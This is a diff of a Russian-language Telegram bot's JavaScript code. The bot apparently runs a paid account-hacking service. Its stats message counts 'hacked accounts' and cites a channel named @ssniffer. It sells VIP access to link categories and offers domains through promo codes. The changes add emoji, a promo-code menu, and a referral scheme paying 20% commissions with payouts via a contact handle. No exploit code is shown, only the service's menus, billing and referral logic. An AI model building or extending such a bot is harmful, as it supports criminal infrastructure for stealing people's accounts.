@@ -115,7 +115,7 @@ bot.onText(/🔗 Мои ссылки/, async (msg) => {
     })
     if (user.isAccepted == 'true') {
         if (user.vip) {
-            bot.sendMessage(msg.chat.id, `Пожалуйста выберите категорию`, {
+            bot.sendMessage(msg.chat.id, `😻 Пожалуйста выберите категорию`, {
                 reply_markup: {
                     inline_keyboard: [
                         [{
@@ -147,7 +147,7 @@ bot.onText(/🔗 Мои ссылки/, async (msg) => {
                 }
             })
         } else {
-            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса.\nВы можете приобрести его пополнив баланс и нажав кнопку ниже`, {
+            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса😔\nВы можете приобрести его пополнив баланс и нажав кнопку ниже⤵️`, {
                 reply_markup: {
                     inline_keyboard: [
                         [{
@@ -166,7 +166,7 @@ bot.onText(/📊 О боте/, async (msg) => {
         tg_id: msg.chat.id
     })
     if (user.isAccepted == 'true') {
-        bot.sendMessage(msg.chat.id, `📊 Статистика\n\nРегистраций в боте: <b>${(await data.find()).length}</b>\nПодписчиков в канале: <b>${await bot.getChatMemberCount('@ssniffer')}</b>\nВзломанных аккаунтов: <b>${(await account.find()).length}</b>\n\nМы работаем с 2021 года.`, {
+        bot.sendMessage(msg.chat.id, `📊 Статистика\n\nРегистраций в боте: <b>${(await data.find()).length}</b>\n👨‍👩‍👧‍👦 Подписчиков в канале: <b>${await bot.getChatMemberCount('@ssniffer')}</b>\n🔐 Взломанных аккаунтов: <b>${(await account.find()).length}</b>\n\n📅 Мы работаем с 2021 года.`, {
             parse_mode: 'HTML'
         })
     }
@@ -178,7 +178,7 @@ bot.onText(/👑 VIP Статус/, async (msg) => {
     console.log()
     if (user.isAccepted == 'true') {
         if (user.vip) {
-            bot.sendMessage(msg.chat.id, `У вас есть <b>VIP</b> статус [${vip[Number(user.vipType)].name}].\nVIP закончится через ${GetStringDate(new Date(user.vipDate))}`, {
+            bot.sendMessage(msg.chat.id, `🤴🏻 У вас есть <b>VIP</b> статус [${vip[Number(user.vipType)].name}].\n\n⏳ VIP закончится через⤵️ \n⏱ ${GetStringDate(new Date(user.vipDate))}`, {
                 reply_markup: {
                     inline_keyboard: [
                         [{
@@ -190,7 +190,7 @@ bot.onText(/👑 VIP Статус/, async (msg) => {
                 parse_mode: 'HTML'
             })
         } else {
-            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса.\nВы можете приобрести его пополнив баланс и нажав кнопку ниже`, {
+            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса😔\nВы можете приобрести его пополнив баланс и нажав кнопку ниже⤵️`, {
                 reply_markup: {
                     inline_keyboard: [
                         [{
@@ -202,14 +202,6 @@ bot.onText(/👑 VIP Статус/, async (msg) => {
                 parse_mode: 'HTML'
             })
         }
-    }
-})
-bot.onText(/👥 Наш чат/, async (msg) => {
-    const user = await data.findOne({
-        tg_id: msg.chat.id
-    })
-    if (user.isAccepted == 'true') {
-        bot.sendMessage(msg.chat.id, 'Вступить в чат можно по ссылке ниже \n' + process.env.Chat)
     }
 })
 bot.onText(/❓ Информация/, async (msg) => {
@@ -254,6 +246,14 @@ bot.onText(/🎁 Получить бонус/, async (msg) => {
         })
     }
 })
+bot.onText(/👥 Наш чат/,  async (msg) => {
+    const user = await data.findOne({
+        tg_id: msg.chat.id
+    })
+    if (user.isAccepted == 'true') {
+        bot.sendMessage(msg.chat.id, 'Вступить в чат можно по ссылке ниже \n' + process.env.Chat)
+   }
+})
 bot.onText(/💸 Пополнение/, async (msg) => {
     const user = await data.findOne({
         tg_id: msg.chat.id
@@ -270,16 +270,39 @@ bot.onText(/💸 Пополнение/, async (msg) => {
         })
     }
 })
+bot.onText(/🎟 Промо-Коды/, async msg=>{
+    const user = await data.findOne({
+        tg_id: msg.chat.id
+    })
+    if (user.isAccepted == 'true') {
+        bot.sendMessage(msg.chat.id, `🎟 Промо-Коды\n\nПромо-коды выдаються только Администрацией.\nКод может содержать различные ценности: VIP, Домен, Пополнения баланса многое другое...\n\nГде достать Промо-Коды?\nМы часто публикуем Промо-Коды, в нашем Новостном канале.\n(${process.env.Channel})\n\nЧто бы забрать Промо-Код первым,\nСоветуем подписаться на канал, и включить колокольчик🔔`,{
+            reply_markup:{
+                inline_keyboard: [[{text: 'Ввести промокод', callback_data: 'promo'}]]
+            },
+            parse_mode: 'html',
+            disable_web_page_preview: true
+        })
+    }
+})
 bot.onText(/👨‍👩‍👧‍👦 Мои рефералы/, async (msg) => {
     const user = await data.findOne({
         tg_id: msg.chat.id
     })
     if (user.isAccepted == 'true') {
-
+        const ref = await data.find({
+            ref_id: msg.chat.id
+        })
+        bot.sendMessage(msg.chat.id, `👨‍👩‍👧‍👦 Мои рефералы\n\nВаш реферальный баланс: ${user.ref_balance||0} RUB\n\nКоличество ваших рефералов: ${ref.length||0}\n\nКаждый Ваш реферал при пополнении своего баланса будет начислять Вам на реферальный баланс +20% от суммы.\nЧто можно будет сделать с реферальным балансом?\n\nПеревести его в общий баланс и использовать на покупку вип и прочего.\n\nПри достижении суммы больше 200 рублей Вы можете запросить выплату на Ваш Qiwi кошелек или на Карту\n\nЧтобы запросить выплату или конвертировать в баланс бота, напишите нашему\nПредставителю: @vincicash_s\n\nВаша реферальная ссылка🔗\n<a>https://t.me/${(await bot.getMe()).username}?start=${user.tg_id}</a>\n\nКлюч для выплат\n<code>${user.tg_id}</code>`,{
+            reply_markup:{
+                inline_keyboard: [[{text: 'Запросить выплату', url: 'https://t.me/VinciCash_S'}]]
+            },
+            parse_mode: 'html',
+            disable_web_page_preview: true
+        })
     }
 })
 
-bot.on('message', async (msg) => {
+bot.on('message',async (msg) => {
     const user = await data.findOne({
         tg_id: msg.chat.id
     })
